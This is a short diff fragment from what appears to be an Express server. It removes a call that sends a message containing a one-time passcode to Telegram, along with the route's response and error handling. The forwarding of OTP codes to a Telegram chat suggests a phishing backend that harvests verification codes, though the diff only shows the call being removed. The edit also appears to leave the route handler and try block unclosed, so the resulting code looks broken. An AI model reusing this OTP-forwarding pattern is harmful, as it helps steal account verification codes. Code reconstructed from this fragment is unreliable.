@@ -164,16 +164,7 @@ ${otp}
   }
 });
 
-    await sendToTelegram(message);
-
-    res.json({ success: true });
-
-  } catch (err) {
-    console.log("OTP ERROR:", err.message);
-    res.json({ success: false });
-  }
-});
-// ==============================
+    // ==============================
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Server running on ${PORT}`);
